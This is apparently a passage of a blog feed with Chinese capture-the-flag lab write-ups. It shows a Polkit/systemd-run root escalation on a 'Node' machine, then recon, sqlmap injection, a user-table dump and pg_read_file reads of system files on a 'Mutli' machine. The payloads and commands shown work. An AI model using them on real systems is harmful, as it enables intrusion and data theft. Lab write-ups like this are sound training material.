==== AUTHENTICATION COMPLETE ===
Running as unit: run-u7.service
Press ^] three times within 1s to disconnect TTY.
root@Node:/# id
uid=0(root) gid=0(root) groups=0(root)
```

输入 `hungry` 用户的密码后，成功获取了一个 root shell。

## 3. 原理分析：Polkit 配置错误

本次提权并非利用了常见的内核漏洞或软件漏洞（如PwnKit），而是一个典型的**安全配置错误**，其核心在于 Polkit 的授权策略被有意地削弱了。

1. **什么是 Polkit 和 `systemd-run`？**

   *   **Polkit (PolicyKit)**: 是一个应用程序级别的授权框架，用于控制哪些用户可以执行哪些需要特权的操作。它就像一个精细化的 `sudo`，不直接给予用户 root shell，而是对具体动作进行授权。
   *   **`systemd-run`**: 是一个 `systemd` 工具，可以用来动态创建一个临时的服务单元并运行指定的命令。当它需要执行特权操作（如以 root 身份运行服务）时，会向 `systemd` 主进程（以 root 权限运行）发出请求。

2. **提权流程是怎样的？**

   *   当 `hungry` 用户执行 `systemd-run -t /bin/bash`，该命令请求 `systemd` 以 root 权限启动一个 `/bin/bash` 进程。
   *   `systemd` 将这个请求交由 Polkit 进行权限裁决。
   *   Polkit 检查其策略，确定 `hungry` 用户是否有权执行这个操作（Action ID 为 `org.freedesktop.systemd1.manage-units`）。

3. **漏洞的关键点在哪里？**

   *   从命令行的输出 `Authenticating as: hungry` 和要求输入密码来看，系统**正在**进行认证。
   *   `org.freedesktop.systemd1.manage-units` 这个操作的默认策略通常是 `auth_admin`，意为**必须由管理员组（如 `sudo` 组）的用户来提供密码进行认证**。
   *   然而，用户 `hungry` 并不在 `sudo` 组里，但提供了**自己的密码**后却认证成功了。这表明 Polkit 的策略被修改了。
   *   最可能的修改是将该操作的授权策略从 `auth_admin`（管理员认证）改为了 **`auth_self_keep`**（用户自身认证）。这意味着“**只要请求者能证明他就是他自己（通过输入自己的密码），就允许执行该特权操作**”。

4. 验证

   需要用户为root权限，否则无法查看

   ```bash
   root@Node:/# cat /etc/polkit-1/rules.d/50-myuser.rules
   polkit.addRule(function(action, subject) {
      
       if (action.id.startsWith('org.freedesktop.systemd1.') &amp;&amp; subject.local &amp;&amp; subject.isInGroup('hungry')) {
           return polkit.Result.YES;
       }
   });
   ```

   - polkit.addRule(function(action, subject) { ... });
     这定义了一条新的 Polkit 规则。action 代表尝试执行的操作，subject 代表发起操作的用户。
   - if (action.id.startsWith('org.freedesktop.systemd1.') &amp;&amp; ...)
     这是第一个条件：检查请求的操作 ID 是否以 'org.freedesktop.systemd1.' 开头。这是一个非常宽泛的规则，它涵盖了所有与 systemd 相关的管理操作，包括但不限于启动/停止服务、启用/禁用服务单元文件等。systemd-run 所触发的操作就在此范围内。
   - ... &amp;&amp; subject.local &amp;&amp; ...
     第二个条件：检查用户是否为本地用户。通过 SSH 登录的交互式会话通常被认为是 local 的。
   - ... &amp;&amp; subject.isInGroup('hungry'))
     **这是最关键的条件**：检查发起操作的用户是否属于名为 'hungry' 的用户组。在很多 Linux 发行版中，创建一个新用户时会同时创建一个同名的主用户组，所以用户 hungry 正好就在 hungry 组里。
   - return polkit.Result.YES;
     如果以上所有三个条件都满足，规则就返回 YES。这表示**无条件允许，无需进行任何认证**。
   - 聪明的朋友肯定发现了，什么不需要验证，我的明明需要验证啊，那是因为linux授权和认证是分离的，Polkit审查这个用户（hungry）有没有资格执行这个操作，PAM审查现在坐在终端前输入命令的这个人，真的是hungry本人吗？

   所以总结实现了**允许任何本地登录的、且属于** **hungry** **用户组的用户，~~无需密码~~（需要密码）即可执行所有 systemd 相关的管理操作。**

   而为什么拿到的是root的shell，为什么不是hungry的shell，是因为systemd是root身份运行的

   所以再概括一下就是**您是以** **hungry** **的身份通过了认证，从而获得了“命令** **systemd** **去做事”的资格；而最终为您创建 shell 的是** **systemd** **进程，它用的是它自己固有的** **root** **身份。**

## 四、夺取旗帜

成功获取 root 权限后，读取最终的 flag。

```bash
root@Node:/# cat /root/root.txt /home/hungry/user.txt
flag{root-c946739aa8e0f1008c32e311076f355f}
flag{user-8c4b1157cb6f8884aa183ac0f1447e6c}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Node.html</guid><pubDate>Wed, 06 Aug 2025 00:48:02 +0000</pubDate></item><item><title>内部_Mutli</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Mutli.html</link><description>![image-20250722152006846](https://7r1UMPHK.github.io/image/20250722152007020.webp)

简单复现一下，看样子后面是准备放去HMV的。其中todd--&gt;我是问群主拿了提示，憋不出来了，哈哈哈

# 一、信息收集

# 1. 主机发现

首先，在内网环境中使用 `arp-scan` 工具扫描本地网络，以发现存活的主机。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.205 08:00:27:b2:39:7d       PCS Systemtechnik GmbH
192.168.205.1   00:50:56:c0:00:08       VMware, Inc. (DUP: 2)
```

扫描结果显示目标主机的 IP 地址为  `192.168.205.205`。

## 2. 端口与服务扫描

确定目标 IP 后，使用 `nmap` 对其进行详细的端口扫描，探测其开放的端口和服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ nmap -p- 192.168.205.205
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-21 23:01 EDT
Nmap scan report for 192.168.205.205
Host is up (0.00015s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
23/tcp    open  telnet
80/tcp    open  http
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
2049/tcp  open  nfs
3306/tcp  open  mysql
28080/tcp open  thor-engine
38007/tcp open  unknown
46413/tcp open  unknown
50129/tcp open  unknown
53115/tcp open  unknown
MAC Address: 08:00:27:B2:39:7D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.07 seconds
```

这里我还以为我眼花了，我还重新扫了一遍，确实Mutli，哈哈哈

扫描一下具体服务

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ nmap -p21,22,23,80,111,139,445,2049,3306,28080,38007,46413,50129,53115 -sC -sV 192.168.205.205 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-21 23:02 EDT
Nmap scan report for 192.168.205.205
Host is up (0.00026s latency).

PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.3
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ftp-server/organizationName=MyOrganization/stateOrProvinceName=Beijing/countryName=CN
| Not valid before: 2025-07-17T11:34:00
|_Not valid after:  2035-07-15T11:34:00
22/tcp    open  ssh         OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
23/tcp    open  telnet      Linux telnetd
80/tcp    open  http        Apache httpd 2.4.62 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.62 (Debian)
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      35543/tcp6  mountd
|   100005  1,2,3      35639/udp6  mountd
|   100005  1,2,3      53115/tcp   mountd
|   100005  1,2,3      57320/udp   mountd
|   100021  1,3,4      37033/udp6  nlockmgr
|   100021  1,3,4      45001/tcp6  nlockmgr
|   100021  1,3,4      45069/udp   nlockmgr
|   100021  1,3,4      46413/tcp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4
2049/tcp  open  nfs         3-4 (RPC #100003)
3306/tcp  open  mysql       MariaDB 10.3.23 or earlier (unauthorized)
28080/tcp open  http        Werkzeug httpd 3.1.3 (Python 3.9.2)
|_http-server-header: Werkzeug/3.1.3 Python/3.9.2
|_http-title: Admin Panel
38007/tcp open  mountd      1-3 (RPC #100005)
46413/tcp open  nlockmgr    1-4 (RPC #100021)
50129/tcp open  mountd      1-3 (RPC #100005)
53115/tcp open  mountd      1-3 (RPC #100005)
MAC Address: 08:00:27:B2:39:7D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2025-07-22T03:02:46
|_  start_date: N/A
|_nbstat: NetBIOS name: MULTI, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.30 seconds
```

- **web** 80,28080
- **共享服务** 2049
- **samba** 139/445
- **FTP** 21
- **数据库** 3306
- **传统端口** 22,23

# 二、初始访问

## ftp

我比较喜欢先看FTP

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ftp 192.168.205.205
Connected to 192.168.205.205.
220 (vsFTPd 3.0.3)
Name (192.168.205.205:kali): anonymous
530 Permission denied.
ftp: Login failed
ftp&gt; exit
221 Goodbye.
```

匿名登录失败

## NFS

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ showmount -e 192.168.205.205
Export list for 192.168.205.205:
/srv/nfs_secure 127.0.0.1
```

只可以他本地挂载，下一个

## **Samba**

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ smbclient -L //192.168.205.205 -N

        Sharename       Type      Comment
        ---------       ----      -------
        secure_share    Disk      
        IPC$            IPC       IPC Service (Secure Samba Server)
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 192.168.205.205 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
                                              
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ cd tmp                                        
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ smbclient //192.168.205.205/secure_share -N 
Try 'help' to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Fri Jul 18 11:22:38 2025
  ..                                  D        0  Thu Jul 17 07:40:23 2025
  bettercap                           N      159  Fri Jul 18 11:22:38 2025

                29801344 blocks of size 1024. 25516556 blocks available
smb: \&gt; get bettercap 
getting file \bettercap of size 159 as bettercap (31.1 KiloBytes/sec) (average 31.1 KiloBytes/sec)
smb: \&gt; exit

┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat bettercap   
bettercap is a powerful, easily extensible and portable framework written in Go which aims to offer to security researchers, red teamers and reverse engineers
```

这个算个提示吧，bettercap比较出名的就是二、三层攻击，这是后面的事情了

## mysql

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ mysql -h 192.168.205.205 -u root -p
Enter password: 
ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '192.168.205.128' is not allowed to connect to this MariaDB server
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ mysql -h 192.168.205.205 -u root -p --skip-ssl
Enter password: 
ERROR 1130 (HY000): Host '192.168.205.128' is not allowed to connect to this MariaDB server
```

不允许我们连接，不白费力气了

## web

80的主页是apache2的初始页，尝试爆破目录，没有任何收获

28080有东西

![image-20250722153917170](https://7r1UMPHK.github.io/image/20250722153917297.webp)

让我们输入用户名，经过尝试，什么名字都可以，没有sql，ssti之类的就单纯使用的user

输入user后会跳转到search

![image-20250722154042672](https://7r1UMPHK.github.io/image/20250722154042794.webp)

可以输入一些用户名继续查看，经过测试有sql注入（去burp抓个包，然后sqlmap -r）

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat 1               
POST /search HTTP/1.1
Host: 192.168.205.205:28080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 9
Origin: http://192.168.205.205:28080
Connection: keep-alive
Referer: http://192.168.205.205:28080/search
Cookie: session=eyJ1c2VyIjoiYSJ9.aH9ASQ.1M-ZU-QfKjkL88N2Pyia0ZmKDkM
Upgrade-Insecure-Requests: 1
Priority: u=0, i

keyword=1                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ sqlmap -r 1 --batch            
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.9.6#stable}
|_ -| . [(]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:44:08 /2025-07-22/

[03:44:08] [INFO] parsing HTTP request from '1'
[03:44:08] [INFO] testing connection to the target URL
[03:44:08] [INFO] checking if the target is protected by some kind of WAF/IPS
[03:44:08] [INFO] testing if the target URL content is stable
[03:44:08] [INFO] target URL content is stable
[03:44:08] [INFO] testing if POST parameter 'keyword' is dynamic
[03:44:08] [WARNING] POST parameter 'keyword' does not appear to be dynamic
[03:44:08] [WARNING] heuristic (basic) test shows that POST parameter 'keyword' might not be injectable
[03:44:08] [INFO] testing for SQL injection on POST parameter 'keyword'
[03:44:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[03:44:09] [WARNING] reflective value(s) found and filtering out
[03:44:09] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[03:44:09] [INFO] testing 'MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[03:44:09] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[03:44:09] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[03:44:09] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[03:44:09] [INFO] testing 'Generic inline queries'
[03:44:09] [INFO] testing 'PostgreSQL &gt; 8.1 stacked queries (comment)'
[03:44:19] [INFO] POST parameter 'keyword' appears to be 'PostgreSQL &gt; 8.1 stacked queries (comment)' injectable 
it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (1) and risk (1) values? [Y/n] Y
[03:44:19] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[03:44:19] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[03:44:19] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[03:44:19] [INFO] target URL appears to have 3 columns in query
[03:44:19] [INFO] POST parameter 'keyword' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'keyword' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 48 HTTP(s) requests:
---
Parameter: keyword (POST)
    Type: stacked queries
    Title: PostgreSQL &gt; 8.1 stacked queries (comment)
    Payload: keyword=1';SELECT PG_SLEEP(5)--

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: keyword=1' UNION ALL SELECT NULL,NULL,(CHR(113)||CHR(118)||CHR(106)||CHR(122)||CHR(113))||(CHR(105)||CHR(104)||CHR(84)||CHR(73)||CHR(72)||CHR(107)||CHR(116)||CHR(117)||CHR(111)||CHR(77)||CHR(114)||CHR(111)||CHR(75)||CHR(115)||CHR(109)||CHR(110)||CHR(99)||CHR(99)||CHR(85)||CHR(69)||CHR(84)||CHR(117)||CHR(65)||CHR(113)||CHR(99)||CHR(65)||CHR(68)||CHR(84)||CHR(89)||CHR(80)||CHR(74)||CHR(78)||CHR(98)||CHR(90)||CHR(68)||CHR(102)||CHR(122)||CHR(74)||CHR(108)||CHR(88))||(CHR(113)||CHR(120)||CHR(98)||CHR(107)||CHR(113))-- ciUr
---
[03:44:19] [INFO] the back-end DBMS is PostgreSQL
back-end DBMS: PostgreSQL
[03:44:19] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.205.205'

[*] ending @ 03:44:19 /2025-07-22/

                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ sqlmap -r 1 --batch -D public -T users --dump                             
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.6#stable}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:44:40 /2025-07-22/

[03:44:40] [INFO] parsing HTTP request from '1'
[03:44:40] [INFO] resuming back-end DBMS 'postgresql' 
[03:44:40] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: keyword (POST)
    Type: stacked queries
    Title: PostgreSQL &gt; 8.1 stacked queries (comment)
    Payload: keyword=1';SELECT PG_SLEEP(5)--

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: keyword=1' UNION ALL SELECT NULL,NULL,(CHR(113)||CHR(118)||CHR(106)||CHR(122)||CHR(113))||(CHR(105)||CHR(104)||CHR(84)||CHR(73)||CHR(72)||CHR(107)||CHR(116)||CHR(117)||CHR(111)||CHR(77)||CHR(114)||CHR(111)||CHR(75)||CHR(115)||CHR(109)||CHR(110)||CHR(99)||CHR(99)||CHR(85)||CHR(69)||CHR(84)||CHR(117)||CHR(65)||CHR(113)||CHR(99)||CHR(65)||CHR(68)||CHR(84)||CHR(89)||CHR(80)||CHR(74)||CHR(78)||CHR(98)||CHR(90)||CHR(68)||CHR(102)||CHR(122)||CHR(74)||CHR(108)||CHR(88))||(CHR(113)||CHR(120)||CHR(98)||CHR(107)||CHR(113))-- ciUr
---
[03:44:40] [INFO] the back-end DBMS is PostgreSQL
back-end DBMS: PostgreSQL
[03:44:40] [INFO] fetching columns for table 'users' in database 'public'
[03:44:40] [WARNING] reflective value(s) found and filtering out
[03:44:40] [INFO] fetching entries for table 'users' in database 'public'
Database: public
Table: users
[4 entries]
+----+-----------------+----------+
| id | email           | username |
+----+-----------------+----------+
| 1  | admin@multi.hmv | admin    |
| 2  | guest@multi.hmv | guest    |
| 3  | test@multi.hmv  | test     |
| 4  | xiao@multi.hmv  | xiao     |
+----+-----------------+----------+

[03:44:40] [INFO] table 'public.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.205.205/dump/public/users.csv'
[03:44:40] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.205.205'

[*] ending @ 03:44:40 /2025-07-22/
```

有域名，加域名爆破

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ sudo vim /etc/hosts                          
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ tail -n 1 /etc/hosts                                                                                                                          
192.168.205.205 multi.hmv 
                
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ wfuzz -c -u 'http://multi.hmv/' -H 'HOST:FUZZ.multi.hmv' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 933
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://multi.hmv/
Total requests: 114442

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                          
=====================================================================

000009532:   400        10 L     35 W       301 Ch      '#www - #www'                                                                                                    
000010581:   400        10 L     35 W       301 Ch      '#mail - #mail'                                                                                                  
000047706:   400        10 L     35 W       301 Ch      '#smtp - #smtp'                                                                                                  
000103135:   400        10 L     35 W       301 Ch      '#pop3 - #pop3'                                                                                                  

Total time: 68.80952
Processed Requests: 114442
```

然后重新爆破目录，没有收获

着重扒拉了一下sql，复现可以读文件

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sqlmap -r tmp/1 --batch --technique=U -p keyword --sql-query 'SELECT pg_read_file('/etc/passwd', 0, 1000000)'
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.6#stable}
|_ -| . [,]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:42:07 /2025-07-21/

[23:42:07] [INFO] parsing HTTP request from 'tmp/1'
[23:42:07] [INFO] resuming back-end DBMS 'postgresql' 
[23:42:07] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: keyword (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: keyword=1' UNION ALL SELECT NULL,(CHR(113)||CHR(120)||CHR(107)||CHR(106)||CHR(113))||(CHR(112)||CHR(80)||CHR(88)||CHR(70)||CHR(67)||CHR(88)||CHR(101)||CHR(120)||CHR(77)||CHR(112)||CHR(109)||CHR(71)||CHR(76)||CHR(87)||CHR(106)||CHR(104)||CHR(107)||CHR(114)||CHR(107)||CHR(85)||CHR(83)||CHR(101)||CHR(82)||CHR(66)||CHR(100)||CHR(99)||CHR(83)||CHR(85)||CHR(80)||CHR(115)||CHR(107)||CHR(100)||CHR(116)||CHR(102)||CHR(101)||CHR(114)||CHR(74)||CHR(110)||CHR(101)||CHR(102))||(CHR(113)||CHR(112)||CHR(113)||CHR(112)||CHR(113)),NULL-- gGka
---
[23:42:07] [INFO] the back-end DBMS is PostgreSQL
back-end DBMS: PostgreSQL
[23:42:07] [INFO] fetching SQL SELECT statement query output: 'SELECT pg_read_file('/etc/passwd', 0, 1000000)'
[23:42:07] [WARNING] reflective value(s) found and filtering out
SELECT pg_read_file('/etc/passwd', 0, 1000000): 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nmessagebus:x:104:110::/nonexistent:/usr/sbin/nologin\nsshd:x:105:65534::/run/sshd:/usr/sbin/nologin\nxiao:x:1001:1001::/home/xiao:/bin/bash\ntelnetd:x:106:113::/nonexistent:/usr/sbin/nologin\nredis:x:107:114::/var/lib/redis:/usr/sbin/nologin\nftp:x:108:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin\nsecure_user:x:1002:1002::/home/secure_user:/bin/bash\nmysql:x:109:116:MySQL Server,,,:/nonexistent:/bin/false\nsamba_user:x:1003:1003::/home/samba_user:/bin/false\n_rpc:x:110:65534::/run/rpcbind:/usr/sbin/nologin\nstatd:x:111:65534::/var/lib/nfs:/usr/sbin/nologin\npostgres:x:112:119:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash\ntodd:x:1000:1000:,,,:/home/todd:/bin/bash\n'
[23:42:07] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.205.203'

[*] ending @ 23:42:07 /2025-07-21/
```

- `xiao:x:1001:1001::/home/xiao:/bin/bash`
- `secure_user:x:1002:1002::/home/secure_user:/bin/bash`
- `todd:x:1000:1000:,,,:/home/todd:/bin/bash`

尝试读取密钥，全都没有权限

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sqlmap -r tmp/1 --batch --technique=U -p keyword --sql-query 'SELECT pg_read_file('/etc/vsftpd.conf', 0, 1000000)'
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.6#stable}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:50:12 /2025-07-21/

[23:50:12] [INFO] parsing HTTP request from 'tmp/1'
[23:50:12] [INFO] resuming back-end DBMS 'postgresql' 
[23:50:12] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: keyword (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: keyword=1' UNION ALL SELECT NULL,(CHR(113)||CHR(120)||CHR(107)||CHR(106)||CHR(113))||(CHR(112)||CHR(80)||CHR(88)||CHR(70)||CHR(67)||CHR(88)||CHR(101)||CHR(120)||CHR(77)||CHR(112)||CHR(109)||CHR(71)||CHR(76)||CHR(87)||CHR(106)||CHR(104)||CHR(107)||CHR(114)||CHR(107)||CHR(85)||CHR(83)||CHR(101)||CHR(82)||CHR(66)||CHR(100)||CHR(99)||CHR(83)||CHR(85)||CHR(80)||CHR(115)||CHR(107)||CHR(100)||CHR(116)||CHR(102)||CHR(101)||CHR(114)||CHR(74)||CHR(110)||CHR(101)||CHR(102))||(CHR(113)||CHR(112)||CHR(113)||CHR(112)||CHR(113)),NULL-- gGka
---
[23:50:12] [INFO] the back-end DBMS is PostgreSQL
back-end DBMS: PostgreSQL
[23:50:12] [INFO] fetching SQL SELECT statement query output: 'SELECT pg_read_file('/etc/vsftpd.conf', 0, 1000000)'
[23:50:12] [WARNING] reflective value(s) found and filtering out
SELECT pg_read_file('/etc/vsftpd.conf', 0, 1000000): 'listen=NO\nlisten_ipv6=YES\nanonymous_enable=NO\nlocal_enable=YES\nwrite_enable=YES\nlocal_umask=022\ndirmessage_enable=YES\nuse_localtime=YES\nxferlog_enable=YES\nconnect_from_port_20=YES\nchroot_local_user=YES\nallow_writeable_chroot=YES\nsecure_chroot_dir=/var/run/vsftpd/empty\npam_service_name=vsftpd\nrsa_cert_file=/etc/ssl/certs/vsftpd.crt\nrsa_private_key_file=/etc/ssl/private/vsftpd.key\nssl_enable=YES\nallow_anon_ssl=NO\nforce_local_data_ssl=YES\nforce_local_logins_ssl=YES\nssl_tlsv1=YES\nssl_sslv2=NO\nssl_sslv3=NO\nrequire_ssl_reuse=NO\nssl_ciphers=HIGH\npasv_min_port=50000\npasv_max_port=50050\nuserlist_enable=YES\nuserlist_file=/etc/vsftpd.userlist\nuserlist_deny=NO\n'
[23:50:12] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.205.203'

[*] ending @ 23:50:12 /2025-07-21/

```

vsftpd其中重点的东西

&gt; listen=NO
&gt; listen_ipv6=YES
&gt; anonymous_enable=NO     # 不允许匿名登录，这和我们之前的测试结果一致
&gt; local_enable=YES        # 允许本地用户登录，这是关键
